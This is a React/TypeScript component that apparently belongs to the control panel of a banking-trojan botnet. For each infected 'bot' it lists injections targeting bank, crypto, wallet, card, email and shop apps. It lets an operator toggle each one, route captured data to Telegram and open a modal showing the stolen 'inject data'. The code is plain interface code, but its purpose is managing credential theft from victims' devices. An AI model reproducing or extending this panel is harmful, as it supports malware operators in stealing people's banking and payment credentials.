import React, {useState} from "react";


import {Swiper, SwiperSlide} from "swiper/react";
import SwiperCore, {Navigation, Pagination} from "swiper";
import {Checkbox, Divider, Space, Switch} from "antd";
import InjectModal from "../../Modals/InjectModal/InjectModal";
import {Bot, BotInjection} from "../../../Model/Bot";
import {getBackendUrl} from "../../../Util/config";
import {useTranslation} from "react-i18next";
import {updateUserTelegramInjection} from "../../../Store/Auth/Actions";
import {AppState} from "../../../Store/RootReducer";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {updateBotInjectIsActive} from "../../../Store/Bots/Actions";

interface InjectionsProps {
    bot: Bot,
    renderType: "table" | "cards",
}

const renderInjectTypesIcon = (inject: string) => {
    switch (inject) {
    case "banks":
        return <i className="type-icon fa-solid fa-building-columns"/>;
    case "crypt":
        return <i className="type-icon fa-brands fa-bitcoin"/>;
    case "emails":
        return <i className="type-icon fa-solid fa-at"/>;
    case "credit_cards":
        return <i className="type-icon fa-solid fa-credit-card"/>;
    case "wallets":
        return <i className="type-icon fa-solid fa-wallet"/>;
    case "shops":
        return <i className="type-icon fa-solid fa-cart-shopping"/>;
    default:
        return <i className="type-icon fa-solid fa-circle-question"/>;
    }
};

interface BotInjectClick {
    bot_id: string,
    inject: string,
}

const Injections: React.FC<InjectionsProps> = (props: InjectionsProps) => {
    const dispatch = useAppDispatch();

    const authReducer = useAppSelector((state: AppState) => state.auth);

    SwiperCore.use([Navigation, Pagination]);

    let botInjectClicks: BotInjectClick[];

    try {
        botInjectClicks = JSON.parse(localStorage.getItem("botInjectClicks") as string) as BotInjectClick[];
    } catch (e) {
        botInjectClicks = [];
        localStorage.setItem("botInjectClicks", JSON.stringify([]));
    }

    if (!botInjectClicks) {
        botInjectClicks = [];
    }

    const onChangeInjectIsActive = (application: string, is_active: boolean) => {
        dispatch(updateBotInjectIsActive(props.bot.id, application, is_active));
    };

    const botInjectClicked = (bot_id: string, inject: string) => {
        return botInjectClicks.filter((click) => click.bot_id === bot_id && click.inject === inject).length > 0;
    };

    const addBotInjectClick = (bot_id: string, inject: string) => {
        if (!botInjectClicks) {
            botInjectClicks = [];
        }

        if (botInjectClicked(bot_id, inject)) {
            return;
        }

        const temp = [
            ...botInjectClicks,
            {
                bot_id: bot_id,
                inject: inject,
            },
        ];

        localStorage.setItem("botInjectClicks", JSON.stringify(temp));
    };

    const openInjectData = (injection: BotInjection) => {
        setSelectedApplication(injection.application);
        addBotInjectClick(props.bot.id, injection.application);
        setShowInjectData(true);
    };

    const [showInjectData, setShowInjectData] = useState(false);
    const [selectedApplication, setSelectedApplication] = useState<string>("");

    const renderInjects = (injects: BotInjection[]) => {
        let i;
        let j;
        const botInjectionsChunks: Array<BotInjection[]> = [];
        const chunk = 14;

        for (i = 0, j = injects.length; i < j; i += chunk) {
            botInjectionsChunks.push(injects.slice(i, i + chunk));
        }

        return botInjectionsChunks.map((injectionsChunk: BotInjection[], id) => {
            return (
                <SwiperSlide key={id}>
                    <div className="injection-list">
                        {injectionsChunk.map((injection: BotInjection, id: number) => {
                            const isClicked = (injection.newData ? "has-data" : (botInjectClicked(props.bot.id, injection.application) ? "clicked-data" : ""));

                            const telegramChecked = authReducer.user.telegramInjections[props.bot.id] &&
                                authReducer.user.telegramInjections[props.bot.id].includes(injection.application);

                            return (
                                <div
                                    className={"injection-inner " + isClicked}
                                    key={id}
                                >
                                    <div className="injection-info">
                                        <div>
                                            <Checkbox className="ant-checkbox-tg"
                                                checked={telegramChecked}
                                                onChange={(e) => {
                                                    dispatch(updateUserTelegramInjection(injection.application, e.target.checked, props.bot.id));
                                                }}/>
                                        </div>
                                        <Switch
                                            checked={injection.is_active}
                                            size="small"
                                            onChange={(is_active: boolean) => {
                                                onChangeInjectIsActive(injection.application, is_active);
                                            }}
                                        />
                                        <div
                                            className="app-icon"
                                            style={{
                                                backgroundImage: `url(${getBackendUrl(`injects/images/${injection.type}/${injection.application}.png`)})`,
                                            }}
                                        />
                                    </div>
                                    <div className="injection-app-name" onClick={() => openInjectData(injection)}>
                                        {injection.name}
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </SwiperSlide>
            );
        });
    };

    const {t} = useTranslation();

    return props.renderType === "cards" ? (
        <div className="injection">
            {props.bot.injections.length > 0 ? (
                <>
                    <Divider
                        orientation="left"
                        style={{margin: "5px 0"}}
                    >
                        {t("BOT_INJECTIONS")} <sup>{props.bot.injections.length}</sup>
                    </Divider>

                    <Swiper
                        spaceBetween={5}
                        slidesPerView={1}
                        className="injection-slider"
                        pagination={{
                            clickable: true,
                        }}
                        navigation={true}
                        uniqueNavElements={true}
                        style={{paddingBottom: 25}}
                    >
                        {renderInjects(props.bot.injections)}
                    </Swiper>
                </>
            ) : (
                <Divider orientation="left" style={{margin: "5px 0", color: "#666"}}>{t("NO_INJECTIONS")}</Divider>
            )}

            <InjectModal
                visible={showInjectData}
                setVisible={setShowInjectData}
                bot={props.bot}
                application={selectedApplication}
            />
        </div>
    ) : (
        <Space direction="vertical">
            {props.bot.injections.map((injection: BotInjection, id: number) => {
                const isClicked = (injection.newData ? "has-data" : (botInjectClicked(props.bot.id, injection.application) ? "clicked-data" : ""));

                return (
                    <div
                        className={"injection-inner " + isClicked}
                        key={id}
                        onClick={() => openInjectData(injection)}
                    >
                        <div className="injection-info">
                            {renderInjectTypesIcon(injection.type)}
                            <div
                                className="injection-app"
                                style={{backgroundImage: `url(${getBackendUrl(`injects/images/${injection.type}/${injection.application}.png`)})`}}
                            />
                        </div>
                        <div className="injection-app-name">
                            {injection.name}
                        </div>
                    </div>
                );
            })}
        </Space>
    );
};

export default Injections;
